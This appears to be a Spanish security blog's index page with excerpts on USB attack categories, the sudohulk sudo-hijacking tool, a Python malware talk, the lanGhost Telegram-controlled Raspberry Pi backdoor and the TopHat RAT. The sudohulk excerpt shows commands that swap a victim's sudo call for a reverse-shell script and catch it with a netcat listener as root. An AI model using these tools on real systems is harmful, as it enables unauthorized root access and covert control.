El propósito de esa investigación fue alertar a los usuarios de las numerosas posibilidades que tiene un atacante de abusar de los dispositivos USB para infectar un sistema y robar de forma encubierta datos de redes protegidas y aisladas. La recomendación del equipo de investigación es que los dispositivos USB estén prohibidos o al menos controlados estrictamente en redes seguras.<br>
<br>
Para clasificar estos métodos de explotación crearon además cuatro categorías diferentes según la forma en que se lleve a cabo el ataque:<br>
<br>
<b>A) Reprogramando el microcontrolador interno del dispositivo USB.</b> El dispositivo se ve como un dispositivo USB normal (por ejemplo un cargador), pero lleva a cabo las operaciones de otro (por ejemplo un teclado que inyecta pulsaciones de teclas).<br>
<br>
<b>B1) Reprogramando el firmware del dispositivo USB para ejecutar acciones maliciosas </b>(como descarga de malware, exfiltración de datos, etc.).<br>
<br>
B2) No reprogramando el firmware del dispositivo USB sino aprovechando los <b>fallos en la forma en que los sistemas operativos normalmente interactúan con los protocolos/estándares USB.</b><br>
<br>
<b>C) Ataques eléctricos basados en USB.</b><br>
<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://4.bp.blogspot.com/-1GT31biQlBA/WqukvNhKbxI/AAAAAAABFM0/Swp9Kl0yXUk8TkK9xbeJYFK6MMCb2OajgCLcBGAs/s1600/USB-attacks.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="569" data-original-width="877" src="https://4.bp.blogspot.com/-1GT31biQlBA/WqukvNhKbxI/AAAAAAABFM0/Swp9Kl0yXUk8TkK9xbeJYFK6MMCb2OajgCLcBGAs/s640/USB-attacks.png" width="530"></a></div>
</div>
<div style='clear: both;'></div>
</div>
<div class='jump-link'>
<a href='http://www.hackplayers.com/2018/03/29-tipos-de-ataque-usb-distintos.html#more'>
Leer más...
</a>
</div>
<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'>
<span class='reaction-buttons'>
</span>
<span class='star-ratings'>
</span>
<span class='post-backlinks post-comment-link'>
<a class='comment-link' href='http://www.hackplayers.com/2018/03/29-tipos-de-ataque-usb-distintos.html#links'>
Enlaces a esta entrada
</a>
</span>
<span class='post-icons'>
<span class='item-action'>
<a href='https://www.blogger.com/email-post.g?blogID=9133539773684103848&postID=7029598773175621050' title='Enviar entrada por correo electrónico'>
<img alt='' class='icon-action' height='13' src='http://www.blogger.com/img/icon18_email.gif' width='18'/>
</a>
</span>
<span class='item-control blog-admin pid-1378769495'>
<a href='https://www.blogger.com/post-edit.g?blogID=9133539773684103848&postID=7029598773175621050&from=pencil' title='Editar entrada'>
<img alt='' class='icon-action' height='18' src='http://www.blogger.com/img/icon18_edit_allbkg.gif' width='18'/>
</a>
</span>
<a href='http://twitter.com/home?status=http://www.hackplayers.com/2018/03/29-tipos-de-ataque-usb-distintos.html 29 tipos de ataque USB distintos' onclick='return TweetAndTrack.open(this, "http://www.hackplayers.com/2018/03/29-tipos-de-ataque-usb-distintos.html");' target='_blank' title='¡Tweetea esto!'>
<span style='display:none;'>
29 tipos de ataque USB distintos
</span>
<img alt='Tweetea esto!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvM3Sb-3wI/AAAAAAAAAH0/6wuL-gO0a3U/twitter.gif' style='height:16px; width:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
<a href='http://www.facebook.com/sharer.php?u=http://www.hackplayers.com/2018/03/29-tipos-de-ataque-usb-distintos.html&t=29 tipos de ataque USB distintos' target='_blank' title='¡Comparte en Facebook!'>
<img alt='¡Comparte en Facebook!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvMxLns3dI/AAAAAAAAAHQ/K5W2YQeN6SY/facebook.gif' style='width:16px; height:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
</span>
</div>
<p></p>
<div class='linkwithin_div'>
</div>
<div class='post-footer-line post-footer-line-3'>
<span class='post-location'>
</span>
</div>
</div>
</div>
<div class='post hentry uncustomized-post-template'>
<a name='6156507209498277094'></a>
<h3 class='post-title entry-title'>
<a href='http://www.hackplayers.com/2018/03/sudohulk-privesc-cambiando-sudo.html'>
Intentando escalar privilegios cambiando el comando de sudo con sudohulk 
</a>
</h3>
<div class='post-footer'>
<div class='post-header-line-1'></div>
<div class='post-footer-line post-footer-line-1'>
<span class='post-author vcard'>
Publicado por
<span class='fn'>
Vicente Motos
</span>
<span class='post-timestamp'>

                                  on 
                                  jueves, 15 de marzo de 2018
</span>
</span>
<span class='post-labels'>
Etiquetas:
<a href='http://www.hackplayers.com/search/label/C' rel='tag'>
C
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/escalado%20de%20privilegios' rel='tag'>
escalado de privilegios
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/herramientas' rel='tag'>
herramientas
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/linux' rel='tag'>
linux
</a>
</span>
<span class='post-comment-link'>

                                Comentarios: (
                                <a class='comment-link' href='http://www.hackplayers.com/2018/03/sudohulk-privesc-cambiando-sudo.html#comment-form' onclick=''>
0
</a>
                                )
                              
</span>
</div>
</div>
<div class='post-header-line-1'></div>
<div class='post-body entry-content'>
<div dir="ltr" style="text-align: left;" trbidi="on">
<div class="separator" style="clear: both; text-align: center;">
<a href="https://2.bp.blogspot.com/-3hMmriaBRpQ/WqqysAFAbRI/AAAAAAABFLo/unqMimUCtKIUV42FQ2IW4-C20DB710lvACLcBGAs/s1600/hulk-sudo.png" imageanchor="1" style="clear: right; float: right; margin-bottom: 1em; margin-left: 1em;"><img border="0" data-original-height="365" data-original-width="486" height="240" src="https://2.bp.blogspot.com/-3hMmriaBRpQ/WqqysAFAbRI/AAAAAAABFLo/unqMimUCtKIUV42FQ2IW4-C20DB710lvACLcBGAs/s320/hulk-sudo.png" width="320"></a></div>
sudohulk es una herramienta que es capaz de cambiar el comando sudo lanzado por otro usuario en otra shell (bash o zsh) <i>hookeando</i> la <i>syscall execve</i> mediante <i>ptrace</i>. Soporta las arquitecturas x86_64, x86 y arm.<br>
<br>
<b>Instalación</b><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><br></span>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">$ git clone https://github.com/hc0d3r/sudohulk.git</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">$ cd sudohulk</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">$ make</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">cc -Wall -Wextra -O2 -c -o bin/sh_remotedata.o src/sh_remotedata.c</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">cc -Wall -Wextra -O2 -c -o bin/sh_string.o src/sh_string.c</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">cc -Wall -Wextra -O2 -c -o bin/sudohulk.o src/sudohulk.c</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">cc -Wall -Wextra -O2 -o sudohulk bin/sh_remotedata.o bin/sh_string.o bin/sudohulk.o</span><br>
<br>
<b>Uso</b><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><br></span>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">$ ./sudohulk </span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">sudohulk [-qdk] PID COMMAND [ARGS]</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><br></span>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">Options:</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">&#160;&#160; -q quit when change a command</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">&#160;&#160; -d run in background</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">&#160;&#160; -k keep original command line (appending to new)</span><br>
<br>
<b>Ejemplo: cambio de comando &#39;ls&#39; por &#39;id&#39; al ejecutar sudo en sesión actual</b><br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">$ ./sudohulk -qd $$ id</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">running in background, pid:20899</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">$ sudo ls -lah</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">[sudo] senha para mmxm: </span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">uid=0(root) gid=0(root) grupos=0(root)</span><br>
<br>
<b>Ejemplo: cambio de comando &#39;ls&#39; por shell reversa con &#39;nc&#39; en la sesión de la víctima</b><br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">malicioso@host:~$ ./sudohulk -q 6610 bash /tmp/shell.sh </span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">starting attach pid: 6610</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><br></span>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">[*] new process created: 6887</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">[+] (6887) sys_execve detected &gt;&gt;&gt; &#39;/usr/bin/sudo&#39;</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">[+] sudo detected</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">[*] overwriting parameters</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">[-] exiting ...</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><br></span>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">victima@host:~$ sudo ls</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">Android&#160;&#160;&#160;&#160;&#160; Escritorio&#160;&#160;&#160;&#160;&#160;&#160;&#160; MEGAsync&#160;&#160;&#160; &#160;&#160;&#160; &#160;&#160; peda&#160;&#160;&#160; &#160;&#160;&#160; &#160;&#160; stopfw.sh</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><br></span>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">malicioso@host:~$ nc -nlvp 6969</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">listening on [any] 6969 ...</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 55866</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">id</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">uid=0(root) gid=0(root) grupos=0(root)</span><br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://2.bp.blogspot.com/-r3h5i0tA9HI/Wqq0xOsdpvI/AAAAAAABFLw/Z5fw7SYroZgLNr2F8qIvT3LHC3g-L87KgCLcBGAs/s1600/sudohulk.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="689" data-original-width="1512" src="https://2.bp.blogspot.com/-r3h5i0tA9HI/Wqq0xOsdpvI/AAAAAAABFLw/Z5fw7SYroZgLNr2F8qIvT3LHC3g-L87KgCLcBGAs/s640/sudohulk.png" width="530"></a></div>
</div>
<div style='clear: both;'></div>
</div>
<div class='jump-link'>
<a href='http://www.hackplayers.com/2018/03/sudohulk-privesc-cambiando-sudo.html#more'>
Leer más...
</a>
</div>
<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'>
<span class='reaction-buttons'>
</span>
<span class='star-ratings'>
</span>
<span class='post-backlinks post-comment-link'>
<a class='comment-link' href='http://www.hackplayers.com/2018/03/sudohulk-privesc-cambiando-sudo.html#links'>
Enlaces a esta entrada
</a>
</span>
<span class='post-icons'>
<span class='item-action'>
<a href='https://www.blogger.com/email-post.g?blogID=9133539773684103848&postID=6156507209498277094' title='Enviar entrada por correo electrónico'>
<img alt='' class='icon-action' height='13' src='http://www.blogger.com/img/icon18_email.gif' width='18'/>
</a>
</span>
<span class='item-control blog-admin pid-1378769495'>
<a href='https://www.blogger.com/post-edit.g?blogID=9133539773684103848&postID=6156507209498277094&from=pencil' title='Editar entrada'>
<img alt='' class='icon-action' height='18' src='http://www.blogger.com/img/icon18_edit_allbkg.gif' width='18'/>
</a>
</span>
<a href='http://twitter.com/home?status=http://www.hackplayers.com/2018/03/sudohulk-privesc-cambiando-sudo.html Intentando escalar privilegios cambiando el comando de sudo con sudohulk ' onclick='return TweetAndTrack.open(this, "http://www.hackplayers.com/2018/03/sudohulk-privesc-cambiando-sudo.html");' target='_blank' title='¡Tweetea esto!'>
<span style='display:none;'>
Intentando escalar privilegios cambiando el comando de sudo con sudohulk 
</span>
<img alt='Tweetea esto!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvM3Sb-3wI/AAAAAAAAAH0/6wuL-gO0a3U/twitter.gif' style='height:16px; width:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
<a href='http://www.facebook.com/sharer.php?u=http://www.hackplayers.com/2018/03/sudohulk-privesc-cambiando-sudo.html&t=Intentando escalar privilegios cambiando el comando de sudo con sudohulk ' target='_blank' title='¡Comparte en Facebook!'>
<img alt='¡Comparte en Facebook!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvMxLns3dI/AAAAAAAAAHQ/K5W2YQeN6SY/facebook.gif' style='width:16px; height:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
</span>
</div>
<p></p>
<div class='linkwithin_div'>
</div>
<div class='post-footer-line post-footer-line-3'>
<span class='post-location'>
</span>
</div>
</div>
</div>
<div class='post hentry uncustomized-post-template'>
<a name='3442767325842947401'></a>
<h3 class='post-title entry-title'>
<a href='http://www.hackplayers.com/2018/03/hacking-con-python-by-daniel-echeverri.html'>
Hacking con Python (by Daniel Echeverri #hc0n2018)
</a>
</h3>
<div class='post-footer'>
<div class='post-header-line-1'></div>
<div class='post-footer-line post-footer-line-1'>
<span class='post-author vcard'>
Publicado por
<span class='fn'>
Vicente Motos
</span>
<span class='post-timestamp'>

                                  on 
                                  miércoles, 14 de marzo de 2018
</span>
</span>
<span class='post-labels'>
Etiquetas:
<a href='http://www.hackplayers.com/search/label/h-c0n' rel='tag'>
h-c0n
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/malware' rel='tag'>
malware
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/python' rel='tag'>
python
</a>
</span>
<span class='post-comment-link'>

                                Comentarios: (
                                <a class='comment-link' href='http://www.hackplayers.com/2018/03/hacking-con-python-by-daniel-echeverri.html#comment-form' onclick=''>
2
</a>
                                )
                              
</span>
</div>
</div>
<div class='post-header-line-1'></div>
<div class='post-body entry-content'>
<div dir="ltr" style="text-align: left;" trbidi="on">
<div dir="ltr" style="text-align: left;" trbidi="on">
Otro de los grandes ponentes y uno de los más populares que tuvimos en la h-c0n fue Daniel Echeverri, más conocido por @adastra. Fundador de The Hacker Way, profesor/colaborador en Securizame, ponente y habitual en muchas conferencias y escritor de varios libros, dos de los cuales (los de Python de 0xword) fueron los más votados por vosotros para el sorteo. <br>
<br>
En el salón de actos de la ETSISI tuvimos la suerte de poder presenciar su charla &#39;Hacking con Python&#39; en la que nos enseñó cómo manipular shellcodes y malware desde Python creando rutinas para la inyección de código malicioso e inyectando en procesos bajo sistemas Linux y Windows. Además de la creación de keyloggers, screen scrapers y webcam scrapers para &quot;monitorizar&quot; la actividad del usuario. Si no estuvisteis os recomiendo al menos echar un vistazo a las slides:<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<iframe height="320" src="https://drive.google.com/file/d/1MEPvBU9uNk7ZJ4Kz85C_FTmCEKiKSFFN/preview" width="530"></iframe></div>
<br>
</div></div>
<div style='clear: both;'></div>
</div>
<div class='jump-link'>
<a href='http://www.hackplayers.com/2018/03/hacking-con-python-by-daniel-echeverri.html#more'>
Leer más...
</a>
</div>
<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'>
<span class='reaction-buttons'>
</span>
<span class='star-ratings'>
</span>
<span class='post-backlinks post-comment-link'>
<a class='comment-link' href='http://www.hackplayers.com/2018/03/hacking-con-python-by-daniel-echeverri.html#links'>
Enlaces a esta entrada
</a>
</span>
<span class='post-icons'>
<span class='item-action'>
<a href='https://www.blogger.com/email-post.g?blogID=9133539773684103848&postID=3442767325842947401' title='Enviar entrada por correo electrónico'>
<img alt='' class='icon-action' height='13' src='http://www.blogger.com/img/icon18_email.gif' width='18'/>
</a>
</span>
<span class='item-control blog-admin pid-1378769495'>
<a href='https://www.blogger.com/post-edit.g?blogID=9133539773684103848&postID=3442767325842947401&from=pencil' title='Editar entrada'>
<img alt='' class='icon-action' height='18' src='http://www.blogger.com/img/icon18_edit_allbkg.gif' width='18'/>
</a>
</span>
<a href='http://twitter.com/home?status=http://www.hackplayers.com/2018/03/hacking-con-python-by-daniel-echeverri.html Hacking con Python (by Daniel Echeverri #hc0n2018)' onclick='return TweetAndTrack.open(this, "http://www.hackplayers.com/2018/03/hacking-con-python-by-daniel-echeverri.html");' target='_blank' title='¡Tweetea esto!'>
<span style='display:none;'>
Hacking con Python (by Daniel Echeverri #hc0n2018)
</span>
<img alt='Tweetea esto!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvM3Sb-3wI/AAAAAAAAAH0/6wuL-gO0a3U/twitter.gif' style='height:16px; width:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
<a href='http://www.facebook.com/sharer.php?u=http://www.hackplayers.com/2018/03/hacking-con-python-by-daniel-echeverri.html&t=Hacking con Python (by Daniel Echeverri #hc0n2018)' target='_blank' title='¡Comparte en Facebook!'>
<img alt='¡Comparte en Facebook!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvMxLns3dI/AAAAAAAAAHQ/K5W2YQeN6SY/facebook.gif' style='width:16px; height:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
</span>
</div>
<p></p>
<div class='linkwithin_div'>
</div>
<div class='post-footer-line post-footer-line-3'>
<span class='post-location'>
</span>
</div>
</div>
</div>
<div class='post hentry uncustomized-post-template'>
<a name='2401285556873862557'></a>
<h3 class='post-title entry-title'>
<a href='http://www.hackplayers.com/2018/03/langhost-un-backdoor-en-tu-rpi-con-telegram.html'>
lanGhost: un backdoor en tu Raspberry Pi controlado mediante Telegram
</a>
</h3>
<div class='post-footer'>
<div class='post-header-line-1'></div>
<div class='post-footer-line post-footer-line-1'>
<span class='post-author vcard'>
Publicado por
<span class='fn'>
Vicente Motos
</span>
<span class='post-timestamp'>

                                  on 
                                  martes, 13 de marzo de 2018
</span>
</span>
<span class='post-labels'>
Etiquetas:
<a href='http://www.hackplayers.com/search/label/backdoor' rel='tag'>
backdoor
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/python' rel='tag'>
python
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/raspberry%20pi' rel='tag'>
raspberry pi
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/telegram' rel='tag'>
telegram
</a>
</span>
<span class='post-comment-link'>

                                Comentarios: (
                                <a class='comment-link' href='http://www.hackplayers.com/2018/03/langhost-un-backdoor-en-tu-rpi-con-telegram.html#comment-form' onclick=''>
0
</a>
                                )
                              
</span>
</div>
</div>
<div class='post-header-line-1'></div>
<div class='post-body entry-content'>
<div dir="ltr" style="text-align: left;" trbidi="on">
Un ejercicio típico de Red Team es llevar a cabo una intrusión física dejando conectado a la red interna de una empresa un dispositivo que hará los labores de <i>backdoor</i> evadiendo así la seguridad perimetral y atacando &quot;desde dentro&quot;.<br>
<br>
Imagina además que ese dispositivo, por ejemplo una Raspberry Pi, puede ser controlado directamente mediante Telegram. Gracias a David Schütz y su herramienta lanGhost es muy fácil hacerlo: una serie de scripts que implementan un conjunto de ataques que pueden ser controlados mediante un bot de Telegram. &#191;Suena bien, verdad? Pues vamos a probarlo!<br>
<br>
Lo primero que haremos es crear el bot como siempre llamando a BotFather:<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://3.bp.blogspot.com/-XA8GoK_CGcU/WqedroS4A_I/AAAAAAABFHU/shYGt-ha77MszWhTr5hj9Fx4xg_-xxxpACLcBGAs/s1600/langhost.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="723" data-original-width="536" src="https://3.bp.blogspot.com/-XA8GoK_CGcU/WqedroS4A_I/AAAAAAABFHU/shYGt-ha77MszWhTr5hj9Fx4xg_-xxxpACLcBGAs/s1600/langhost.png"></a></div>
<br>
<br>
Ahora accederemos a la RPi y ejecutaremos los siguientes comandos:<br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">$ sudo apt update &amp;&amp; sudo apt install python3 python3-pip</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">$ git clone https://github.com/xdavidhu/lanGhost</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">$ cd lanGhost</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">$ sudo ./setup.py</span><br>
</div>
<div style='clear: both;'></div>
</div>
<div class='jump-link'>
<a href='http://www.hackplayers.com/2018/03/langhost-un-backdoor-en-tu-rpi-con-telegram.html#more'>
Leer más...
</a>
</div>
<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'>
<span class='reaction-buttons'>
</span>
<span class='star-ratings'>
</span>
<span class='post-backlinks post-comment-link'>
<a class='comment-link' href='http://www.hackplayers.com/2018/03/langhost-un-backdoor-en-tu-rpi-con-telegram.html#links'>
Enlaces a esta entrada
</a>
</span>
<span class='post-icons'>
<span class='item-action'>
<a href='https://www.blogger.com/email-post.g?blogID=9133539773684103848&postID=2401285556873862557' title='Enviar entrada por correo electrónico'>
<img alt='' class='icon-action' height='13' src='http://www.blogger.com/img/icon18_email.gif' width='18'/>
</a>
</span>
<span class='item-control blog-admin pid-1378769495'>
<a href='https://www.blogger.com/post-edit.g?blogID=9133539773684103848&postID=2401285556873862557&from=pencil' title='Editar entrada'>
<img alt='' class='icon-action' height='18' src='http://www.blogger.com/img/icon18_edit_allbkg.gif' width='18'/>
</a>
</span>
<a href='http://twitter.com/home?status=http://www.hackplayers.com/2018/03/langhost-un-backdoor-en-tu-rpi-con-telegram.html lanGhost: un backdoor en tu Raspberry Pi controlado mediante Telegram' onclick='return TweetAndTrack.open(this, "http://www.hackplayers.com/2018/03/langhost-un-backdoor-en-tu-rpi-con-telegram.html");' target='_blank' title='¡Tweetea esto!'>
<span style='display:none;'>
lanGhost: un backdoor en tu Raspberry Pi controlado mediante Telegram
</span>
<img alt='Tweetea esto!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvM3Sb-3wI/AAAAAAAAAH0/6wuL-gO0a3U/twitter.gif' style='height:16px; width:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
<a href='http://www.facebook.com/sharer.php?u=http://www.hackplayers.com/2018/03/langhost-un-backdoor-en-tu-rpi-con-telegram.html&t=lanGhost: un backdoor en tu Raspberry Pi controlado mediante Telegram' target='_blank' title='¡Comparte en Facebook!'>
<img alt='¡Comparte en Facebook!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvMxLns3dI/AAAAAAAAAHQ/K5W2YQeN6SY/facebook.gif' style='width:16px; height:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
</span>
</div>
<p></p>
<div class='linkwithin_div'>
</div>
<div class='post-footer-line post-footer-line-3'>
<span class='post-location'>
</span>
</div>
</div>
</div>
<div class='post hentry uncustomized-post-template'>
<a name='5411226021658406907'></a>
<h3 class='post-title entry-title'>
<a href='http://www.hackplayers.com/2018/03/tophat-un-rat-fud-con-una-shell-cifrada.html'>
TopHat: un RAT FuD con una shell cifrada con RSA
</a>
</h3>
<div class='post-footer'>
<div class='post-header-line-1'></div>
<div class='post-footer-line post-footer-line-1'>
<span class='post-author vcard'>
Publicado por
<span class='fn'>
Vicente Motos
</span>
<span class='post-timestamp'>

                                  on 
                                  lunes, 12 de marzo de 2018
</span>
</span>
<span class='post-labels'>
Etiquetas:
<a href='http://www.hackplayers.com/search/label/cifrado' rel='tag'>
cifrado
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/c%C3%B3digo%20abierto' rel='tag'>
código abierto
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/herramientas' rel='tag'>
herramientas
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/malware' rel='tag'>
malware
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/python' rel='tag'>
python
</a>
</span>
<span class='post-comment-link'>

                                Comentarios: (
                                <a class='comment-link' href='http://www.hackplayers.com/2018/03/tophat-un-rat-fud-con-una-shell-cifrada.html#comment-form' onclick=''>
0
</a>
                                )
                              
</span>
</div>
</div>
<div class='post-header-line-1'></div>
<div class='post-body entry-content'>
<div dir="ltr" style="text-align: left;" trbidi="on">
TopHat está basado en las características de meterpreter de metasploit; sin embargo Eitenne, su autor, se ha currado un pequeño script en Python para generar un backdoor cifrado no detectable. Sencillo pero eficaz, tal y como se muestra en los siguientes vídeos:<br />
<br />
<div style="text-align: center;">
<iframe allowfullscreen="" class="YOUTUBE-iframe-video" frameborder="0" height="345" src="http://www.youtube.com/embed/eLry2UrxCCc" width="560"></iframe><br />
<span style="font-size: xx-small;"><i>Url del video</i>: <a href="https://www.youtube.com/watch?v=eLry2UrxCCc">https://youtu.be/eLry2UrxCCc</a></span></div>
<br />
<br />
<div style="text-align: center;">
<iframe allowfullscreen="" class="YOUTUBE-iframe-video" frameborder="0" height="345" src="http://www.youtube.com/embed/qc6ivtL6IdA" width="560"></iframe><br />
<span style="font-size: xx-small;"><i>Url del video</i>: <a href="https://www.youtube.com/watch?v=qc6ivtL6IdA">https://youtu.be/qc6ivtL6IdA</a></span></div>
<br />
<b>Github</b>: <a href="https://github.com/Eitenne/TopHat" target="_blank">https://github.com/Eitenne/TopHat</a></div>
<div style='clear: both;'></div>
</div>
<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'>
<span class='reaction-buttons'>
</span>
<span class='star-ratings'>
</span>
<span class='post-backlinks post-comment-link'>
<a class='comment-link' href='http://www.hackplayers.com/2018/03/tophat-un-rat-fud-con-una-shell-cifrada.html#links'>
Enlaces a esta entrada
</a>
</span>
<span class='post-icons'>
<span class='item-action'>
<a href='https://www.blogger.com/email-post.g?blogID=9133539773684103848&postID=5411226021658406907' title='Enviar entrada por correo electrónico'>
<img alt='' class='icon-action' height='13' src='http://www.blogger.com/img/icon18_email.gif' width='18'/>
</a>
</span>
<span class='item-control blog-admin pid-1378769495'>
<a href='https://www.blogger.com/post-edit.g?blogID=9133539773684103848&postID=5411226021658406907&from=pencil' title='Editar entrada'>
<img alt='' class='icon-action' height='18' src='http://www.blogger.com/img/icon18_edit_allbkg.gif' width='18'/>
</a>
</span>
<a href='http://twitter.com/home?status=http://www.hackplayers.com/2018/03/tophat-un-rat-fud-con-una-shell-cifrada.html TopHat: un RAT FuD con una shell cifrada con RSA' onclick='return TweetAndTrack.open(this, "http://www.hackplayers.com/2018/03/tophat-un-rat-fud-con-una-shell-cifrada.html");' target='_blank' title='¡Tweetea esto!'>
<span style='display:none;'>
TopHat: un RAT FuD con una shell cifrada con RSA
</span>
<img alt='Tweetea esto!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvM3Sb-3wI/AAAAAAAAAH0/6wuL-gO0a3U/twitter.gif' style='height:16px; width:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
<a href='http://www.facebook.com/sharer.php?u=http://www.hackplayers.com/2018/03/tophat-un-rat-fud-con-una-shell-cifrada.html&t=TopHat: un RAT FuD con una shell cifrada con RSA' target='_blank' title='¡Comparte en Facebook!'>
<img alt='¡Comparte en Facebook!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvMxLns3dI/AAAAAAAAAHQ/K5W2YQeN6SY/facebook.gif' style='width:16px; height:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
</span>
</div>
<p></p>
<div class='linkwithin_div'>
</div>
<div class='post-footer-line post-footer-line-3'>
<span class='post-location'>
</span>
</div>
</div>
</div>
<div class='post hentry uncustomized-post-template'>
<a name='3081700154233717588'></a>
<h3 class='post-title entry-title'>
<a href='http://www.hackplayers.com/2018/03/ctfr-exprimiendo-la-transparencia-de.html'>
CTFR, exprimiendo la transparencia de los certificados SSL
</a>
</h3>
<div class='post-footer'>
<div class='post-header-line-1'></div>
<div class='post-footer-line post-footer-line-1'>
<span class='post-author vcard'>
Publicado por
<span class='fn'>
Alejandro Taibo
</span>
<span class='post-timestamp'>

                                  on 
                                  jueves, 8 de marzo de 2018
</span>
</span>
<span class='post-labels'>
Etiquetas:
<a href='http://www.hackplayers.com/search/label/an%C3%A1lisis' rel='tag'>
análisis
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/enumeraci%C3%B3n' rel='tag'>
enumeración
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/herramientas' rel='tag'>
herramientas
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/SSL' rel='tag'>
SSL
</a>
</span>
<span class='post-comment-link'>

                                Comentarios: (
                                <a class='comment-link' href='http://www.hackplayers.com/2018/03/ctfr-exprimiendo-la-transparencia-de.html#comment-form' onclick=''>

                                    1
                                    
</a>
                                )
                              
</span>
</div>
</div>
<div class='post-header-line-1'></div>
<div class='post-body entry-content'>
